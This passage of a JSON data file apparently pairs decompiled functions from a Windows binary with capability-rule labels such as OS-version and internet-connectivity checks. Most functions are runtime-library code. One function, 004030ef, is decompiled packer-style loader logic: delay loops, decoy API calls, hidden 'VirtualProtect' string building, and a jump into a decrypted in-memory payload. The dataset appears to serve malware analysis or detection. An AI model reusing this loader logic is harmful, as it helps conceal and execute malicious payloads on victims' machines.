uVar9;\n                *(puVar17 + 0xd) = uVar10;\n                *(puVar17 + 0x6c) = uVar11;\n                *(puVar17 + 0xe) = uVar12;\n                *(puVar17 + 0x74) = uVar13;\n                *(puVar17 + 0xf) = uVar14;\n                *(puVar17 + 0x7c) = uVar15;\n                noname_1 = noname_1 + 0x10;\n                puVar17 = puVar17 + 0x10;\n            }\n            if ((arg_10h & 0x7f) != 0) {\n                for (uVar19 = (arg_10h & 0x7f) >> 4; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    uVar24 = *(noname_1 + 4);\n                    uVar25 = *(noname_1 + 1);\n                    uVar26 = *(noname_1 + 0xc);\n                    *puVar17 = *noname_1;\n                    *(puVar17 + 4) = uVar24;\n                    *(puVar17 + 1) = uVar25;\n                    *(puVar17 + 0xc) = uVar26;\n                    noname_1 = noname_1 + 2;\n                    puVar17 = puVar17 + 2;\n                }\n                if ((arg_10h & 0xf) != 0) {\n                    for (uVar19 = (arg_10h & 0xf) >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar17 = *noname_1;\n                        noname_1 = noname_1 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n                        *puVar17 = *noname_1;\n                        noname_1 = noname_1 + 1;\n                        puVar17 = puVar17 + 1;\n                    }\n                }\n            }\n            return arg_8h;\n        }\n        if ((*0x44500c & 1) == 0) goto code_r0x00405cfb;\n        if ((arg_8h & 3) != 0) goto code_r0x00405d18;\n        if ((noname_1 & 3) == 0) {\n            if ((arg_8h >> 2 & 1) != 0) {\n                uVar24 = *noname_1;\n                arg_10h = arg_10h - 4;\n                noname_1 = noname_1 + 4;\n                *arg_8h = uVar24;\n                arg_8h = arg_8h + 4;\n            }\n            if ((arg_8h >> 3 & 1) != 0) {\n                uVar1 = *noname_1;\n                arg_10h = arg_10h - 8;\n                noname_1 = noname_1 + 1;\n                *arg_8h = uVar1;\n                arg_8h = arg_8h + 1;\n            }\n            if ((noname_1 & 7) == 0) {\n                puVar17 = noname_1 + -1;\n                uVar24 = *noname_1;\n                uVar25 = *(noname_1 + 4);\n                do {\n                    puVar21 = puVar17;\n                    uVar5 = *(puVar21 + 4);\n                    uVar6 = *(puVar21 + 0x24);\n                    arg_10h = arg_10h - 0x30;\n                    auVar2 = *(puVar21 + 2);\n                    uVar26 = *(puVar21 + 7);\n                    uVar4 = *(puVar21 + 0x3c);\n                    auVar3 = *(puVar21 + 4);\n                    *(arg_8h + 1) = uVar24;\n                    *(arg_8h + 0xc) = uVar25;\n                    *(arg_8h + 2) = uVar5;\n                    *(arg_8h + 0x14) = uVar6;\n                    *(arg_8h + 2) = SUB3216(auVar2 >> 0x40, 0);\n                    *(arg_8h + 4) = SUB3216(auVar3 >> 0x40, 0);\n                    arg_8h = arg_8h + 6;\n                    puVar17 = puVar21 + 6;\n                    uVar24 = uVar26;\n                    uVar25 = uVar4;\n                } while (0x2f < arg_10h);\n                puVar21 = puVar21 + 7;\n            }\n            else if ((noname_1 >> 3 & 1) == 0) {\n                iVar16 = noname_1 + -4;\n                uVar24 = *noname_1;\n                uVar25 = *(noname_1 + 4);\n                uVar26 = *(noname_1 + 1);\n                do {\n                    iVar20 = iVar16;\n                    uVar7 = *(iVar20 + 0x20);\n                    arg_10h = arg_10h - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar4 = *(iVar20 + 0x34);\n                    uVar5 = *(iVar20 + 0x38);\n                    uVar6 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(arg_8h + 4) = uVar24;\n                    *(arg_8h + 1) = uVar25;\n                    *(arg_8h + 0xc) = uVar26;\n                    *(arg_8h + 2) = uVar7;\n                    *(arg_8h + 2) = SUB3216(auVar2 >> 0x20, 0);\n                    *(arg_8h + 4) = SUB3216(auVar3 >> 0x20, 0);\n                    arg_8h = arg_8h + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar4;\n                    uVar25 = uVar5;\n                    uVar26 = uVar6;\n                } while (0x2f < arg_10h);\n                puVar21 = iVar20 + 0x34;\n            }\n            else {\n                iVar16 = noname_1 + -0xc;\n                uVar24 = *noname_1;\n                do {\n                    iVar20 = iVar16;\n                    uVar26 = *(iVar20 + 0x20);\n                    uVar4 = *(iVar20 + 0x24);\n                    uVar5 = *(iVar20 + 0x28);\n                    arg_10h = arg_10h - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar25 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(arg_8h + 0xc) = uVar24;\n                    *(arg_8h + 2) = uVar26;\n                    *(arg_8h + 0x14) = uVar4;\n                    *(arg_8h + 3) = uVar5;\n                    *(arg_8h + 2) = SUB3216(auVar2 >> 0x60, 0);\n                    *(arg_8h + 4) = SUB3216(auVar3 >> 0x60, 0);\n                    arg_8h = arg_8h + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar25;\n                } while (0x2f < arg_10h);\n                puVar21 = iVar20 + 0x3c;\n            }\n            for (; 0xf < arg_10h; arg_10h = arg_10h - 0x10) {\n                uVar24 = *puVar21;\n                uVar25 = *(puVar21 + 4);\n                uVar26 = *(puVar21 + 1);\n                uVar4 = *(puVar21 + 0xc);\n                puVar21 = puVar21 + 2;\n                *arg_8h = uVar24;\n                *(arg_8h + 4) = uVar25;\n                *(arg_8h + 1) = uVar26;\n                *(arg_8h + 0xc) = uVar4;\n                arg_8h = arg_8h + 2;\n            }\n            if ((arg_10h >> 2 & 1) != 0) {\n                uVar24 = *puVar21;\n                arg_10h = arg_10h - 4;\n                puVar21 = puVar21 + 4;\n                *arg_8h = uVar24;\n                arg_8h = arg_8h + 4;\n            }\n            if ((arg_10h >> 3 & 1) != 0) {\n                arg_10h = arg_10h - 8;\n                *arg_8h = *puVar21;\n            }\n    // WARNING: Could not recover jumptable at 0x00405cf9. Too many branches\n    // WARNING: Treating indirect jump as call\n            puVar17 = (**(arg_10h * 4 + 0x405e28))();\n            return puVar17;\n        }\n    }\n    uVar18 = arg_10h >> 2;\n    if (uVar18 < 8) {\ncode_r0x00405d38:\n    // WARNING: Could not recover jumptable at 0x00405d38. Too many branches\n    // WARNING: Treating indirect jump as call\n        puVar17 = (**(uVar18 * 4 + 0x405dbc))();\n        return puVar17;\n    }\n    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n        *puVar17 = *noname_1;\n        noname_1 = noname_1 + 4;\n        puVar17 = puVar17 + 4;\n    }\n    switch(*((arg_10h & 3) * 4 + 0x405e28)) {\n    case 0x405e38:\n        return arg_8h;\n    case 0x405e4c:\ncode_r0x00405e4c:\n        *puVar17 = *noname_1;\n        *(puVar17 + 1) = *(noname_1 + 1);\n        return arg_8h;\n    case 0x405e60:\ncode_r0x00405e60:\n        *puVar17 = *noname_1;\n        *(puVar17 + 1) = *(noname_1 + 1);\n        *(puVar17 + 2) = *(noname_1 + 2);\n        return arg_8h;\n    }\ncode_r0x00405e40:\n    *puVar17 = *noname_1;\n    return arg_8h;\n}\n",
        "token_count": 6313
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl method.std::_Iostream_error_category.virtual_8(uint arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch == 1) {\n        fcn.004047ba(\"iostream stream error\");\n    }\n    else {\n        fcn.004011e8(arg_8h, arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 80
    },
    "004030ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004030ef(void)\n\n{\n    code *pcVar1;\n    uint extraout_ECX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpSystemInfo;\n    int32_t var_2fch;\n    uint var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint lpNumberOfCharsWritten;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    int32_t var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t dwWriteCoord;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x451ffc == 0x6016e) {\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(0);\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        (*_sym.imp.USER32.dll_EnumThreadWindows)(0, 0, 0);\n        (*_sym.imp.USER32.dll_SetDoubleClickTime)(0);\n        (*_sym.imp.USER32.dll_BroadcastSystemMessageA)(0, &dwWriteCoord, 0, 0, 0);\n        (*_sym.imp.USER32.dll_PostThreadMessageA)(0, 0, 0, 0);\n        (*_sym.imp.USER32.dll_CreateDesktopW)(0, 0, 0, 0, 0, 0);\n        fcn.00406c85(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar3 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        (*_sym.imp.USER32.dll_GetMenuBarInfo)(0, 0, 0, 0);\n        (*_sym.imp.USER32.dll_GetScrollBarInfo)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(&lpSystemInfo);\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0);\n        if ((0x1b9ab1 < iVar3) && (((var_144h != 0x60051d89 || (var_144h >> 0x1f != 2)) && (var_2fch != 0x66729f13))))\n        break;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x301c8ffd);\n    fcn.00401a12();\n    dwWriteCoord = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, *0x451ffc);\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x3f80ed) {\n            *0x452bbc = *0x444c7c;\n            *0x44dc74 = dwWriteCoord;\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x7aa767);\n    uVar2 = 0;\n    if (*0x451ffc != 0) {\n        do {\n            dwWriteCoord = *0x452bbc + 0x8f176;\n            *(*0x44dc74 + uVar2) = *(dwWriteCoord + uVar2);\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x451ffc);\n    }\n    fcn.004012b0();\n    var_8h = 0x40;\n    *0x446ff8 = 0x6e72656b;\n    *0x446fff = 0x6c642e32;\n    iVar3 = 0x65353;\n    *0x446ffd = 0x336c;\n    *0x446ffc = 0x65;\n    *0x447003 = 0x6c;\n    do {\n        if (*0x451ffc == 0xa69) {\n            dwWriteCoord = 0;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterW)(0, 0, 0, 0, &lpNumberOfCharsWritten);\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *0x452bc2 = 0x61757472;\n    *0x452bca = 0x74636574;\n    *0x452bc6 = 0x6f72506c;\n    *0x452bc0 = 0x6956;\n    *0x452bce = 0;\n    fcn.004019f7();\n    var_1e0h = 0x3ab1e315;\n    var_270h = 0x11ec0f70;\n    var_16ch = 0x4cdaf16;\n    var_1a0h = 0x6c5a8c6c;\n    var_1f0h = 0x1dda535e;\n    var_2f0h = 0x5d730d7c;\n    var_1f8h = 0x4da4ace2;\n    var_178h = 0x41b5d805;\n    var_ech = 0x359bbdbe;\n    var_19ch = 0x79a63980;\n    var_124h = 0x1cac7cb7;\n    var_278h = 0x6dc2e6bc;\n    var_168h = 0x4ebb7a2c;\n    var_10ch = 0x3ab95aa;\n    var_114h = 0x46420dbc;\n    var_200h = 0x585e837f;\n    var_2b8h = 0x11cf6407;\n    var_194h = 0x537eb3b6;\n    var_14ch = 0x474d7cea;\n    var_208h = 0x21ed2648;\n    var_280h = 0x2fc6e1e6;\n    var_210h = 0x56db700d;\n    var_2d8h = 0x490f0a5f;\n    var_218h = 0x6d5c0fc0;\n    var_288h = 0x27fe988b;\n    var_220h = 0x75646b5f;\n    var_1e4h = 0x4c5a17cb;\n    var_228h = 0x2e81407e;\n    var_290h = 0x5d52b3d3;\n    var_18ch = 0x1dd42843;\n    var_230h = 0x3ec16a7;\n    var_190h = 0x2d70c3bd;\n    var_2e8h = 0x2f6f18d6;\n    var_238h = 0x42f1e318;\n    var_f8h = 0x5e8ca6fe;\n    var_298h = 0x4bdd661b;\n    var_240h = 0x37212cf4;\n    var_2c8h = 0x6672fd7c;\n    var_248h = 0x67282b0c;\n    var_2a0h = 0x77536d2c;\n    var_250h = 0x2bb6aa62;\n    var_2e0h = 0x1e2e72f2;\n    var_258h = 0x5ee3117b;\n    var_2a8h = 0x6c4d275b;\n    var_260h = 0x429ac70f;\n    var_2d0h = 0x7b736a5e;\n    var_268h = 0x4afcce45;\n    var_2b0h = 0x1d13132e;\n    var_1e8h = 0xf15623e;\n    var_1ech = 0x5ab478fa;\n    var_1f4h = 0x60697e96;\n    var_1fch = 0x5d76176c;\n    var_204h = 0x58bf3d2d;\n    var_20ch = 0x190c9212;\n    var_214h = 0x3763000b;\n    var_21ch = 0x19e5f369;\n    var_224h = 0x1163dbca;\n    var_22ch = 0x556f1ea2;\n    var_234h = 0x4b6bb0f8;\n    var_23ch = 0x3859356;\n    var_244h = 0x1c73cef7;\n    var_24ch = 0x5993216b;\n    var_254h = 0x2a40277f;\n    var_25ch = 0x33aef21e;\n    var_264h = 0x7111fc5e;\n    var_26ch = 0x550c9878;\n    var_274h = 0x2401805b;\n    var_27ch = 0x62d2d24b;\n    var_284h = 0x361da6a1;\n    var_28ch = 0x13eabe52;\n    var_294h = 0x6bbe98c1;\n    var_29ch = 0x2f915490;\n    var_2a4h = 0x7d43d361;\n    var_2ach = 0x678af443;\n    var_2b4h = 0x7d8e2615;\n    var_2bch = 0x417aa32d;\n    var_2c4h = 0x37b1a4f3;\n    var_2cch = 0x1b9c577b;\n    var_2d4h = 0x9a04bf5;\n    var_2dch = 0x65c6d12f;\n    var_2e4h = 0x1a720cde;\n    var_2ech = 0x3018910f;\n    var_ach = 0x781cd790;\n    var_68h = 0x341d0641;\n    var_1d4h = 0x9bba8134;\n    var_b8h = 0xdfd30f7a;\n    var_80h = 0x7f9731;\n    var_1ch = 0x58340705;\n    var_140h = 0x9cce1e0c;\n    var_8ch = 0x2d895f9;\n    var_50h = 0x957dd823;\n    var_7ch = 0xfc73375f;\n    var_30h = 0xae594f94;\n    var_b0h = 0x29f235d4;\n    var_104h = 0x16109320;\n    var_90h = 0xb34a0b01;\n    var_1bch = 0xe5c34f2b;\n    var_5ch = 0xf6354d03;\n    var_154h = 0x38d42b89;\n    var_a4h = 0x1c138fe5;\n    var_15ch = 0xdaeddcde;\n    var_94h = 0x9daf8d69;\n    var_c8h = 0x21fff8e1;\n    var_108h = 0xe85d0b8b;\n    var_b4h = 0x50bf23a0;\n    var_1dch = 0x3ec83927;\n    var_164h = 0xc6679cf7;\n    var_1a4h = 0x388a2218;\n    var_1c4h = 0x62bef5e;\n    var_24h = 0xf667ec0e;\n    var_64h = 0x7081fb81;\n    var_174h = 0x2db05a2e;\n    var_74h = 0xebab93a1;\n    var_1ach = 0xa180c55b;\n    var_17ch = 0x7705e01f;\n    var_9ch = 0x3b3f576d;\n    var_148h = 0x6389ecff;\n    var_44h = 0xaa2ba4e6;\n    var_d4h = 0xa3b53728;\n    var_d0h = 0x31418c32;\n    var_a0h = 0xcf8ac1c6;\n    var_6ch = 0x63133d52;\n    var_20h = 0x103fbb33;\n    var_184h = 0xdeb835b7;\n    var_1b4h = 0x44dc8e84;\n    var_c4h = 0x34caf9b1;\n    var_4ch = 0x1b357f5e;\n    var_d8h = 0x908e45d1;\n    var_88h = 0x3f210c93;\n    var_1cch = 0xf9e4b2ef;\n    var_134h = 0xba7670b6;\n    var_ch = 0x7d0ab579;\n    var_130h = 0x5c031849;\n    var_e0h = 0x579e5cdc;\n    var_10h = 0x10d788ba;\n    var_84h = 0xe5adeedc;\n    var_150h = 0xdb50ea16;\n    var_158h = 0xf95cfc53;\n    var_38h = 0xe2f68f3;\n    var_18h = 0x1f355f7d;\n    var_160h = 0x2d7daa5e;\n    var_70h = 0x98093969;\n    var_170h = 0x5b7f747;\n    var_28h = 0xcc57a48d;\n    var_bch = 0x442d5382;\n    var_e8h = 0x93e7ceea;\n    var_12ch = 0xdac9426d;\n    var_f4h = 0xcb5140ec;\n    var_180h = 0x7fb5ba5f;\n    var_188h = 0xe4cc5f66;\n    var_60h = 0x3388123a;\n    var_198h = 0xf6cf2e74;\n    var_11ch = 0x40ecf0f3;\n    var_4h = 0xab04096e;\n    var_2ch = 0x54434f39;\n    var_fch = 0x65685833;\n    var_40h = 0xb21efcd6;\n    var_13ch = 0x2dd7ae86;\n    var_c0h = 0xf439dfa6;\n    var_cch = 0xe38ee7b;\n    var_1a8h = 0x90db8a77;\n    var_14h = 0x719edac9;\n    var_138h = 0xc3380004;\n    var_3ch = 0xc1b9422b;\n    var_dch = 0x530e055d;\n    var_98h = 0x59c30d7e;\n    var_34h = 0x3c553e2a;\n    var_e4h = 0xb9b16ad3;\n    var_f0h = 0x6c57d02;\n    var_1b0h = 0x305c9bc5;\n    var_a8h = 0x4a32d5f3;\n    var_1b8h = 0xb5646cb;\n    var_1c0h = 0x75abe51e;\n    var_100h = 0xe563d430;\n    var_110h = 0x4d9174ab;\n    var_118h = 0x4e37bef4;\n    var_1c8h = 0x114c3cbd;\n    var_1d0h = 0x4698cbaf;\n    var_48h = 0xefedd962;\n    var_120h = 0x26b2f7b5;\n    var_128h = 0x2d3996b0;\n    var_78h = 0xb846dfa3;\n    var_1d8h = 0xa6c0fb65;\n    var_144h = 0x34eba593;\n    var_54h = 0x738a618c;\n    fcn.004018dc(extraout_ECX);\n    *0x44dc74 = fcn.004019dd();\n    (**0x44dc74)();\n    return;\n}\n",
        "token_count": 5112
    },
    "004048a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004048a4(uint *param_1, char param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if ((param_2 != '\\0') && (0xf < param_1[5])) {\n        uVar1 = *param_1;\n        if (param_3 != 0) {\n            fcn.004052e0(param_1, uVar1, param_3);\n        }\n        fcn.0040635f(uVar1);\n    }\n    param_1[4] = param_3;\n    param_1[5] = 0xf;\n    *(param_3 + param_1) = 0;\n    return;\n}\n",
        "token_count": 159
    },
    "00404a42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00404a42(uint *param_1, uint32_t param_2, char param_3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (param_2 != 0xffffffff) {\n        if (param_1[5] < param_2) {\n            fcn.00404b0d(param_2, param_1[4]);\n        }\n        else if ((param_3 == '\\0') || (0xf < param_2)) {\n            if (param_2 == 0) {\n                param_1[4] = 0;\n                if (0xf < param_1[5]) {\n                    param_1 = *param_1;\n                }\n                *param_1 = 0;\n            }\n        }\n        else {\n            uVar2 = param_1[4];\n            if (param_2 < param_1[4]) {\n                uVar2 = param_2;\n            }\n            fcn.004048a4(1, uVar2);\n        }\n        return param_2 != 0;\n    }\n    fcn.004051f3(\"string too long\");\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "00404de2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404de2(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar2 = 0x4294e0;\n    if (*0x4294e4 != 0) {\n        do {\n            if (*piVar2 == arg_8h) {\n                return piVar2[1];\n            }\n            piVar1 = piVar2 + 3;\n            piVar2 = piVar2 + 2;\n        } while (*piVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 137
    },
    "00404e0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404e0c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar2 = 0x429288;\n    if (*0x42928c != 0) {\n        do {\n            if (*piVar2 == arg_8h) {\n                return piVar2[1];\n            }\n            piVar1 = piVar2 + 3;\n            piVar2 = piVar2 + 2;\n        } while (*piVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 135
    },
    "00407679": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407679(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0040970c(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 81
    },
    "0040970c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040970c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4457ec, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00409004();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040905d(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00406b56": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00406c4b: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00406c50)\n// WARNING: Removing unreachable block (ram,0x00406c7f)\n// WARNING: Removing unreachable block (ram,0x00406c56)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406b56(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t unaff_EBP;\n    int32_t *piVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00409270(0x4417f8, 0x1c);\n    fcn.0040a7e9(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar5 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x444fc8 != 1) {\n        *0x444ff0 = 1;\n        *0x444fec = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x456c90);\n            *(unaff_EBP + -0x2c) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar5)(*0x456c8c);\n                *(unaff_EBP + -0x1c) = piVar2;\n                *(unaff_EBP + -0x20) = piVar3;\n                do {\n                    *(unaff_EBP + -0x24) = piVar3;\n                    piVar7 = piVar3;\n                    do {\n                        do {\n                            piVar7 = piVar7 + -1;\n                            *(unaff_EBP + -0x24) = piVar7;\n                            if (piVar7 < piVar2) goto code_r0x00406c22;\n                            iVar4 = (*_sym.imp.KERNEL32.dll_EncodePointer)(0);\n                        } while (*piVar7 == iVar4);\n                        if (piVar7 < piVar2) goto code_r0x00406c22;\n                        pcVar5 = (*pcVar5)(*piVar7);\n                        iVar4 = (*_sym.imp.KERNEL32.dll_EncodePointer)(0);\n                        *piVar7 = iVar4;\n                        (*pcVar5)();\n                        pcVar5 = _sym.imp.KERNEL32.dll_DecodePointer;\n                        uVar6 = 